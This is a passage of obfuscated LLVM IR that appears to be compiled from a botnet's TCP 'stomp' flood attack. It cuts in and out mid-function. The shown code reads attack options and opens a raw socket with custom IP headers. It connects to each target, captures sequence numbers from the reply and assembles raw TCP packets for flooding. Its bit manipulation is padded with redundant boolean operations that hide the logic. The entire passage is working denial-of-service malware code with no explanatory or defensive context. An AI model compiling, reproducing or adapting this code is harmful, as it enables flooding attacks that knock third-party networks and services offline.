  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %845

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #6
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %845

; <label>:114:                                    ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

; <label>:115:                                    ; preds = %706, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %711

; <label>:120:                                    ; preds = %115
  br label %121

; <label>:121:                                    ; preds = %701, %687, %120
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121
  br label %706

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %127, i32 3, i32 0)
  %129 = and i32 %128, 2048
  %130 = xor i32 %128, 2048
  %131 = or i32 %129, %130
  %132 = or i32 %128, 2048
  %133 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 4, i32 %131)
  %134 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %134, align 4
  %135 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i64 %137
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %138, i32 0, i32 2
  %140 = load i8, i8* %139, align 4
  %141 = zext i8 %140 to i32
  %142 = icmp slt i32 %141, 32
  br i1 %142, label %143, label %166

; <label>:143:                                    ; preds = %125
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 1
  %149 = load i32, i32* %148, align 4
  %150 = call i32 @ntohl(i32 %149) #7
  %151 = call i32 @rand_next()
  %152 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i32 0, i32 2
  %157 = load i8, i8* %156, align 4
  %158 = zext i8 %157 to i32
  %159 = lshr i32 %151, %158
  %160 = sub i32 0, %159
  %161 = sub i32 %150, %160
  %162 = add i32 %150, %159
  %163 = call i32 @htonl(i32 %161) #7
  %164 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %165 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %164, i32 0, i32 0
  store i32 %163, i32* %165, align 4
  br label %175

; <label>:166:                                    ; preds = %125
  %167 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %168 = load i32, i32* %9, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %174 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %173, i32 0, i32 0
  store i32 %172, i32* %174, align 4
  br label %175

; <label>:175:                                    ; preds = %166, %143
  %176 = load i16, i16* %17, align 2
  %177 = zext i16 %176 to i32
  %178 = icmp eq i32 %177, 65535
  br i1 %178, label %179, label %191

; <label>:179:                                    ; preds = %175
  %180 = call i32 @rand_next()
  %181 = xor i32 %180, -1
  %182 = xor i32 65535, -1
  %183 = xor i32 1296442094, -1
  %184 = or i32 %181, %182
  %185 = or i32 1296442094, %183
  %186 = xor i32 %184, -1
  %187 = and i32 %186, %185
  %188 = and i32 %180, 65535
  %189 = trunc i32 %187 to i16
  %190 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %189, i16* %190, align 2
  br label %195

; <label>:191:                                    ; preds = %175
  %192 = load i16, i16* %17, align 2
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %193, i16* %194, align 2
  br label %195

; <label>:195:                                    ; preds = %191, %179
  %196 = load i32, i32* %26, align 4
  %197 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %198 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %198, %struct.sockaddr** %197, align 8
  %199 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %200 = load %struct.sockaddr*, %struct.sockaddr** %199, align 8
  %201 = call i32 @connect(i32 %196, %struct.sockaddr* %200, i32 16)
  %202 = call i64 @time(i64* null) #6
  store i64 %202, i64* %31, align 8
  br label %203

; <label>:203:                                    ; preds = %704, %195
  store i32 16, i32* %29, align 4
  %204 = load i32, i32* %10, align 4
  %205 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %206 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %207 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %207, %struct.sockaddr** %206, align 8
  %208 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %209 = load %struct.sockaddr*, %struct.sockaddr** %208, align 8
  %210 = call i64 @recvfrom(i32 %204, i8* %205, i64 256, i32 16384, %struct.sockaddr* %209, i32* %29)
  %211 = trunc i64 %210 to i32
  store i32 %211, i32* %33, align 4
  %212 = load i32, i32* %33, align 4
  %213 = icmp eq i32 %212, -1
  br i1 %213, label %214, label %215

; <label>:214:                                    ; preds = %203
  br label %845

; <label>:215:                                    ; preds = %203
  %216 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %217 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 4
  %219 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %220 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %219, i32 0, i32 0
  %221 = load i32, i32* %220, align 4
  %222 = icmp eq i32 %218, %221
  br i1 %222, label %223, label %693

; <label>:223:                                    ; preds = %215
  %224 = load i32, i32* %33, align 4
  %225 = sext i32 %224 to i64
  %226 = icmp ugt i64 %225, 40
  br i1 %226, label %227, label %693

; <label>:227:                                    ; preds = %223
  %228 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %229 = getelementptr inbounds i8, i8* %228, i64 20
  %230 = bitcast i8* %229 to %struct.tcphdr*
  store %struct.tcphdr* %230, %struct.tcphdr** %35, align 8
  %231 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 0
  %233 = load i16, i16* %232, align 4
  %234 = zext i16 %233 to i32
  %235 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %236 = load i16, i16* %235, align 2
  %237 = zext i16 %236 to i32
  %238 = icmp eq i32 %234, %237
  br i1 %238, label %239, label %692

; <label>:239:                                    ; preds = %227
  %240 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = lshr i16 %242, 9
  %244 = xor i16 %243, -1
  %245 = xor i16 1, -1
  %246 = xor i16 8711, -1
  %247 = or i16 %244, %245
  %248 = or i16 8711, %246
  %249 = xor i16 %247, -1
  %250 = and i16 %249, %248
  %251 = and i16 %243, 1
  %252 = zext i16 %250 to i32
  %253 = icmp ne i32 %252, 0
  br i1 %253, label %254, label %661

; <label>:254:                                    ; preds = %239
  %255 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 4
  %257 = load i16, i16* %256, align 4
  %258 = lshr i16 %257, 12
  %259 = xor i16 %258, -1
  %260 = xor i16 1, -1
  %261 = xor i16 -27450, -1
  %262 = or i16 %259, %260
  %263 = or i16 -27450, %261
  %264 = xor i16 %262, -1
  %265 = and i16 %264, %263
  %266 = and i16 %258, 1
  %267 = zext i16 %265 to i32
  %268 = icmp ne i32 %267, 0
  br i1 %268, label %269, label %661

; <label>:269:                                    ; preds = %254
  %270 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %271 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %270, i32 0, i32 0
  %272 = load i32, i32* %271, align 4
  %273 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %274 = load i32, i32* %9, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %273, i64 %275
  %277 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %276, i32 0, i32 0
  store i32 %272, i32* %277, align 4
  %278 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 2
  %280 = load i32, i32* %279, align 4
  %281 = call i32 @ntohl(i32 %280) #7
  %282 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %283 = load i32, i32* %9, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %282, i64 %284
  %286 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %285, i32 0, i32 1
  store i32 %281, i32* %286, align 4
  %287 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %288 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %287, i32 0, i32 3
  %289 = load i32, i32* %288, align 4
  %290 = call i32 @ntohl(i32 %289) #7
  %291 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %292 = load i32, i32* %9, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %291, i64 %293
  %295 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %294, i32 0, i32 2
  store i32 %290, i32* %295, align 4
  %296 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 1
  %298 = load i16, i16* %297, align 2
  %299 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %300 = load i32, i32* %9, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %299, i64 %301
  %303 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %302, i32 0, i32 3
  store i16 %298, i16* %303, align 4
  %304 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %305 = load i16, i16* %304, align 2
  %306 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %307 = load i32, i32* %9, align 4
  %308 = sext i32 %307 to i64
  %309 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %306, i64 %308
  %310 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %309, i32 0, i32 4
  store i16 %305, i16* %310, align 2
  %311 = load i32, i32* %24, align 4
  %312 = sext i32 %311 to i64
  %313 = sub i64 0, 40
  %314 = sub i64 0, %312
  %315 = add i64 %313, %314
  %316 = sub i64 0, %315
  %317 = add i64 40, %312
  %318 = call noalias i8* @malloc(i64 %316) #6
  %319 = load i8**, i8*** %12, align 8
  %320 = load i32, i32* %9, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds i8*, i8** %319, i64 %321
  store i8* %318, i8** %322, align 8
  %323 = load i8**, i8*** %12, align 8
  %324 = load i32, i32* %9, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds i8*, i8** %323, i64 %325
  %327 = load i8*, i8** %326, align 8
  %328 = bitcast i8* %327 to %struct.iphdr*
  store %struct.iphdr* %328, %struct.iphdr** %36, align 8
  %329 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %330 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %329, i64 1
  %331 = bitcast %struct.iphdr* %330 to %struct.tcphdr*
  store %struct.tcphdr* %331, %struct.tcphdr** %37, align 8
  %332 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %333 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %332, i64 1
  %334 = bitcast %struct.tcphdr* %333 to i8*
  store i8* %334, i8** %38, align 8
  %335 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %336 = bitcast %struct.iphdr* %335 to i8*
  %337 = load i8, i8* %336, align 4
  %338 = xor i8 %337, -1
  %339 = xor i8 15, -1
  %340 = xor i8 55, -1
  %341 = or i8 %338, %339
  %342 = or i8 55, %340
  %343 = xor i8 %341, -1
  %344 = and i8 %343, %342
  %345 = and i8 %337, 15
  %346 = and i8 %344, 64
  %347 = xor i8 %344, 64
  %348 = or i8 %346, %347
  %349 = or i8 %344, 64
  store i8 %348, i8* %336, align 4
  %350 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %351 = bitcast %struct.iphdr* %350 to i8*
  %352 = load i8, i8* %351, align 4
  %353 = xor i8 %352, -1
  %354 = xor i8 -16, -1
  %355 = xor i8 70, -1
  %356 = or i8 %353, %354
  %357 = or i8 70, %355
  %358 = xor i8 %356, -1
  %359 = and i8 %358, %357
  %360 = and i8 %352, -16
  %361 = and i8 %359, 5
  %362 = xor i8 %359, 5
  %363 = or i8 %361, %362
  %364 = or i8 %359, 5
  store i8 %363, i8* %351, align 4
  %365 = load i8, i8* %13, align 1
  %366 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %367 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %366, i32 0, i32 1
  store i8 %365, i8* %367, align 1
  %368 = load i32, i32* %24, align 4
  %369 = sext i32 %368 to i64
  %370 = sub i64 0, 40
  %371 = sub i64 0, %369
  %372 = add i64 %370, %371
  %373 = sub i64 0, %372
  %374 = add i64 40, %369
  %375 = trunc i64 %373 to i16
  %376 = call zeroext i16 @htons(i16 zeroext %375) #7
  %377 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %378 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %377, i32 0, i32 2
  store i16 %376, i16* %378, align 2
  %379 = load i16, i16* %14, align 2
  %380 = call zeroext i16 @htons(i16 zeroext %379) #7
  %381 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %382 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %381, i32 0, i32 3
  store i16 %380, i16* %382, align 4
  %383 = load i8, i8* %15, align 1
  %384 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 5
  store i8 %383, i8* %385, align 4
  %386 = load i8, i8* %16, align 1
  %387 = icmp ne i8 %386, 0
  br i1 %387, label %388, label %392

; <label>:388:                                    ; preds = %269
  %389 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %390 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %391 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %390, i32 0, i32 4
  store i16 %389, i16* %391, align 2
  br label %392

; <label>:392:                                    ; preds = %388, %269
  %393 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %394 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %393, i32 0, i32 6
  store i8 6, i8* %394, align 1
  %395 = load i32, i32* @LOCAL_ADDR, align 4
  %396 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %397 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %396, i32 0, i32 8
  store i32 %395, i32* %397, align 4
  %398 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %399 = load i32, i32* %9, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %398, i64 %400
  %402 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %401, i32 0, i32 0
  %403 = load i32, i32* %402, align 4
  %404 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 9
  store i32 %403, i32* %405, align 4
  %406 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %407 = load i32, i32* %9, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %406, i64 %408
  %410 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %409, i32 0, i32 3
  %411 = load i16, i16* %410, align 4
  %412 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 0
  store i16 %411, i16* %413, align 4
  %414 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %415 = load i32, i32* %9, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %414, i64 %416
  %418 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %417, i32 0, i32 4
  %419 = load i16, i16* %418, align 2
  %420 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %421 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %420, i32 0, i32 1
  store i16 %419, i16* %421, align 2
  %422 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %423 = load i32, i32* %9, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %422, i64 %424
  %426 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %425, i32 0, i32 2
  %427 = load i32, i32* %426, align 4
  %428 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 2
  store i32 %427, i32* %429, align 4
  %430 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %431 = load i32, i32* %9, align 4
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %430, i64 %432
  %434 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %433, i32 0, i32 1
  %435 = load i32, i32* %434, align 4
  %436 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %437 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %436, i32 0, i32 3
  store i32 %435, i32* %437, align 4
  %438 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %439 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %438, i32 0, i32 4
  %440 = load i16, i16* %439, align 4
  %441 = xor i16 %440, -1
  %442 = xor i16 -241, -1
  %443 = xor i16 25712, -1
  %444 = or i16 %441, %442
  %445 = or i16 25712, %443
  %446 = xor i16 %444, -1
  %447 = and i16 %446, %445
  %448 = and i16 %440, -241
  %449 = and i16 %447, 128
  %450 = xor i16 %447, 128
  %451 = or i16 %449, %450
  %452 = or i16 %447, 128
  store i16 %451, i16* %439, align 4
  %453 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %454 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %453, i32 0, i32 4
  %455 = load i16, i16* %454, align 4
  %456 = xor i16 %455, -1
  %457 = xor i16 -257, -1
  %458 = xor i16 -6713, -1
  %459 = or i16 %456, %457
  %460 = or i16 -6713, %458
  %461 = xor i16 %459, -1
  %462 = and i16 %461, %460
  %463 = and i16 %455, -257
  %464 = and i16 %462, 256
  %465 = xor i16 %462, 256
  %466 = or i16 %464, %465
  %467 = or i16 %462, 256
  store i16 %466, i16* %454, align 4
  %468 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %469 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %468, i32 0, i32 4
  %470 = load i16, i16* %469, align 4
  %471 = xor i16 -4097, -1
  %472 = xor i16 %470, %471
  %473 = and i16 %472, %470
  %474 = and i16 %470, -4097
  %475 = xor i16 %473, -1
  %476 = xor i16 4096, -1
  %477 = xor i16 27482, -1
  %478 = and i16 %475, 27482
  %479 = and i16 %473, %477
  %480 = and i16 %476, 27482
  %481 = and i16 4096, %477
  %482 = or i16 %478, %479
  %483 = or i16 %480, %481
  %484 = xor i16 %482, %483
  %485 = or i16 %475, %476
  %486 = xor i16 %485, -1
  %487 = or i16 27482, %477
  %488 = and i16 %486, %487
  %489 = or i16 %484, %488
  %490 = or i16 %473, 4096
  store i16 %489, i16* %469, align 4
  %491 = call i32 @rand_next()
  %492 = xor i32 %491, -1
  %493 = xor i32 65535, -1
  %494 = xor i32 2070004232, -1
  %495 = or i32 %492, %493
  %496 = or i32 2070004232, %494
  %497 = xor i32 %495, -1
  %498 = and i32 %497, %496
  %499 = and i32 %491, 65535
  %500 = trunc i32 %498 to i16
  %501 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %502 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %501, i32 0, i32 5
  store i16 %500, i16* %502, align 2
  %503 = load i8, i8* %18, align 1
  %504 = sext i8 %503 to i16
  %505 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %506 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %505, i32 0, i32 4
  %507 = load i16, i16* %506, align 4
  %508 = xor i16 %504, -1
  %509 = xor i16 1, -1
  %510 = xor i16 27819, -1
  %511 = or i16 %508, %509
  %512 = or i16 27819, %510
  %513 = xor i16 %511, -1
  %514 = and i16 %513, %512
  %515 = and i16 %504, 1
  %516 = shl i16 %514, 13
  %517 = xor i16 %507, -1
  %518 = xor i16 -8193, -1
  %519 = xor i16 -15773, -1
  %520 = or i16 %517, %518
  %521 = or i16 -15773, %519
  %522 = xor i16 %520, -1
  %523 = and i16 %522, %521
  %524 = and i16 %507, -8193
  %525 = and i16 %523, %516
  %526 = xor i16 %523, %516
  %527 = or i16 %525, %526
  %528 = or i16 %523, %516
  store i16 %527, i16* %506, align 4
  %529 = load i8, i8* %19, align 1
  %530 = sext i8 %529 to i16
  %531 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %532 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %531, i32 0, i32 4
  %533 = load i16, i16* %532, align 4
  %534 = xor i16 1, -1
  %535 = xor i16 %530, %534
  %536 = and i16 %535, %530
  %537 = and i16 %530, 1
  %538 = shl i16 %536, 12
  %539 = xor i16 %533, -1
  %540 = xor i16 -4097, -1
  %541 = xor i16 29895, -1
  %542 = or i16 %539, %540
  %543 = or i16 29895, %541
  %544 = xor i16 %542, -1
  %545 = and i16 %544, %543
  %546 = and i16 %533, -4097
  %547 = xor i16 %545, -1
  %548 = xor i16 %538, -1
  %549 = xor i16 29603, -1
  %550 = and i16 %547, 29603
  %551 = and i16 %545, %549
  %552 = and i16 %548, 29603
  %553 = and i16 %538, %549
  %554 = or i16 %550, %551
  %555 = or i16 %552, %553
  %556 = xor i16 %554, %555
  %557 = or i16 %547, %548
  %558 = xor i16 %557, -1
  %559 = or i16 29603, %549
  %560 = and i16 %558, %559
  %561 = or i16 %556, %560
  %562 = or i16 %545, %538
  store i16 %561, i16* %532, align 4
  %563 = load i8, i8* %20, align 1
  %564 = sext i8 %563 to i16
  %565 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %566 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %565, i32 0, i32 4
  %567 = load i16, i16* %566, align 4
  %568 = xor i16 %564, -1
  %569 = xor i16 1, -1
  %570 = xor i16 5275, -1
  %571 = or i16 %568, %569
  %572 = or i16 5275, %570
  %573 = xor i16 %571, -1
  %574 = and i16 %573, %572
  %575 = and i16 %564, 1
  %576 = shl i16 %574, 11
  %577 = xor i16 -2049, -1
  %578 = xor i16 %567, %577
  %579 = and i16 %578, %567
  %580 = and i16 %567, -2049
  %581 = xor i16 %579, -1
  %582 = xor i16 %576, -1
  %583 = xor i16 31158, -1
  %584 = and i16 %581, 31158
  %585 = and i16 %579, %583
  %586 = and i16 %582, 31158
  %587 = and i16 %576, %583
  %588 = or i16 %584, %585
  %589 = or i16 %586, %587
  %590 = xor i16 %588, %589
  %591 = or i16 %581, %582
  %592 = xor i16 %591, -1
  %593 = or i16 31158, %583
  %594 = and i16 %592, %593
  %595 = or i16 %590, %594
  %596 = or i16 %579, %576
  store i16 %595, i16* %566, align 4
  %597 = load i8, i8* %21, align 1
  %598 = sext i8 %597 to i16
  %599 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %600 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %599, i32 0, i32 4
  %601 = load i16, i16* %600, align 4
